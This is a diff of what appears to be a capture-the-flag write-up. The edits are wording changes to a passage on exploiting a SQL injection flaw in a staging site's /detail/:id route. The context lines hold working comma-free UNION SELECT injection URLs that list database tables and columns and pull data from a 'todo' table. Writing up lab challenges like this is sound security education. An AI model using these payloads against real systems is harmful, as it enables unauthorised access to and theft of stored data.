@@ -50,7 +50,7 @@ app.get('/detail/:id', function(req, res, next) {
 ```
 As only caveat it has to be ensured, that the **comma character has to be avoided** in the SQL statement as the application splits up the query at the commas.
 Furthermore it is important to note that "union" requires that the **number of columns on both sides match**.
-Due to the fact, that the `union` database has 7 columns, it has to be ensured, that also on the right hand side of the `union` 7 columns have to be delivered.
+Due to the fact, that the ```uniquecontact``` table has 7 columns, it has to be ensured, that also on the right hand side of the `union` 7 columns have to be provided.
 
 This URL is the base for all following SQLi attacks:
 ```
@@ -69,7 +69,7 @@ This can be rewritten for our SQLi flaw:
 ```
 https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select table_name from information_schema.tables)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 ```
-This reveals, that in addition to the tables `emails` and `uniquecontact`, which are known as they are used in the application and in the provided schema of encontact `encontact_db.sql`, there is an additional table `todo`, which seems to be the todo list we need access to.
+This reveals, that in addition to the tables `users`, `emails` and `uniquecontact`, which are known as they are used in the application and in the provided schema of encontact `encontact_db.sql`, there is an additional table `todo`, which seems to be the todo list we need access to.
 
 Using the SQL statement
 ```
@@ -80,7 +80,7 @@ This can be rewritten for the SQLi as follows:
 ```
 https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select column_name from information_schema.columns where table_name="todo")d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
 ```
-we can see, that this table consists out of 3 columns: `id`, `note`, `completed`.
+We can see, that this table consists out of 3 columns: `id`, `note`, `completed`.
 The `note` column can then be extracted using
 ```
 select note from todo;
